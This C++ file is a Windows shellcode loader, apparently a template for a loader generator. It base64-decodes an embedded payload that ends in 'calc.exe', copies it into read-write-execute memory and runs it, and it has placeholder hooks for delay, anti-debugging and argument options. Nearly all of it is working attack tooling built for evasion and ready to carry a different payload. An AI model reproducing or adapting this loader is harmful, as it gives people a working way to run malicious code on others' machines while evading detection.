#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <wincrypt.h>

//####DEFINE####

int base64_decode_f120c5e21f6e400bb3f40b6119bbe704(unsigned char* encoded, int length)
 {


    printf("\n[*] Before BASE64 values: {");
    for (DWORD i = 0; i < length; i++) {
        printf("0x%02x", encoded[i]);
        if (i < length - 1) {
            printf(",");
        }
    }
    printf("}\n");

    DWORD dwDecodedSize = 0;
    BOOL result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, NULL, &dwDecodedSize, NULL, NULL);
    if (!result) {
        printf("[-] Error calculating decoded size\n");
        return -1;
    }

    unsigned char* decoded = (unsigned char*)malloc(dwDecodedSize);
    if (decoded == NULL) {
        printf("[-] Memory allocation failed\n");
        return -1;
    }

    result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, decoded, &dwDecodedSize, NULL, NULL);
    if (!result) {
        printf("[-] Error decoding base64\n");
        free(decoded);
        return -1;
    }

    // Debug statement to print the decoded values
    printf("\n[*] After BASE64 values: {");
    for (DWORD i = 0; i < dwDecodedSize; i++) {
        printf("0x%02x", decoded[i]);
        if (i < dwDecodedSize - 1) {
            printf(",");
        }
    }
    printf("}\n");

    memcpy(encoded, decoded, dwDecodedSize);
    free(decoded);

    return dwDecodedSize;
}


DWORD WINAPI esc_main(LPVOID lpParameter)
{
    DWORD dwSize;
    //HANDLE currentProcess;

    const unsigned char raw[] = {0x2f,0x45,0x69,0x44,0x35,0x50,0x44,0x6f,0x77,0x41,0x41,0x41,0x41,0x45,0x46,0x52,0x51,0x56,0x42,0x53,0x55,0x56,0x5a,0x49,0x4d,0x64,0x4a,0x6c,0x53,0x49,0x74,0x53,0x59,0x45,0x69,0x4c,0x55,0x68,0x68,0x49,0x69,0x31,0x49,0x67,0x53,0x49,0x74,0x79,0x55,0x45,0x67,0x50,0x74,0x30,0x70,0x4b,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x44,0x78,0x68,0x66,0x41,0x49,0x73,0x49,0x45,0x48,0x42,0x79,0x51,0x31,0x42,0x41,0x63,0x48,0x69,0x37,0x56,0x4a,0x42,0x55,0x55,0x69,0x4c,0x55,0x69,0x43,0x4c,0x51,0x6a,0x78,0x49,0x41,0x64,0x43,0x4c,0x67,0x49,0x67,0x41,0x41,0x41,0x42,0x49,0x68,0x63,0x42,0x30,0x5a,0x30,0x67,0x42,0x30,0x46,0x43,0x4c,0x53,0x42,0x68,0x45,0x69,0x30,0x41,0x67,0x53,0x51,0x48,0x51,0x34,0x31,0x5a,0x49,0x2f,0x38,0x6c,0x42,0x69,0x7a,0x53,0x49,0x53,0x41,0x48,0x57,0x54,0x54,0x48,0x4a,0x53,0x44,0x48,0x41,0x72,0x45,0x48,0x42,0x79,0x51,0x31,0x42,0x41,0x63,0x45,0x34,0x34,0x48,0x58,0x78,0x54,0x41,0x4e,0x4d,0x4a,0x41,0x68,0x46,0x4f,0x64,0x46,0x31,0x32,0x46,0x68,0x45,0x69,0x30,0x41,0x6b,0x53,0x51,0x48,0x51,0x5a,0x6b,0x47,0x4c,0x44,0x45,0x68,0x45,0x69,0x30,0x41,0x63,0x53,0x51,0x48,0x51,0x51,0x59,0x73,0x45,0x69,0x45,0x67,0x42,0x30,0x45,0x46,0x59,0x51,0x56,0x68,0x65,0x57,0x56,0x70,0x42,0x57,0x45,0x46,0x5a,0x51,0x56,0x70,0x49,0x67,0x2b,0x77,0x67,0x51,0x56,0x4c,0x2f,0x34,0x46,0x68,0x42,0x57,0x56,0x70,0x49,0x69,0x78,0x4c,0x70,0x56,0x2f,0x2f,0x2f,0x2f,0x31,0x31,0x49,0x75,0x67,0x45,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x53,0x49,0x32,0x4e,0x41,0x51,0x45,0x41,0x41,0x45,0x47,0x36,0x4d,0x59,0x74,0x76,0x68,0x2f,0x2f,0x56,0x75,0x2f,0x43,0x31,0x6f,0x6c,0x5a,0x42,0x75,0x71,0x61,0x56,0x76,0x5a,0x33,0x2f,0x31,0x55,0x69,0x44,0x78,0x43,0x67,0x38,0x42,0x6e,0x77,0x4b,0x67,0x50,0x76,0x67,0x64,0x51,0x57,0x37,0x52,0x78,0x4e,0x79,0x62,0x32,0x6f,0x41,0x57,0x55,0x47,0x4a,0x32,0x76,0x2f,0x56,0x59,0x32,0x46,0x73,0x59,0x79,0x35,0x6c,0x65,0x47,0x55,0x41};
    int length = sizeof(raw);

    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
    memcpy(encoded, raw, length);
    //SIZE_T bytesWritten;

    length = base64_decode_f120c5e21f6e400bb3f40b6119bbe704(encoded, length);

    unsigned char* decoded = encoded;

    //currentProcess = GetCurrentProcess();

    printf("[*] Allocating %d bytes of memory\n", length);
    void *exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec == NULL)
        return -1;

    bool success = false;
    success = memcpy(exec, decoded, length);
    if (!success){
        printf("[-] Oh gosh, something went wrong!\n");
        return -2;
    }
    
    int ret_val = 0;
    printf("[*] Executing\n");
    ((void (*)())exec)();
    
    printf("[+] The shellcode finished with a return value: %08X\n", ret_val);
    return 0;
}

int main()
{
    //####DELAY####
    //####ANTIDEBUG####
    //####ARGS####

    esc_main(NULL);
}
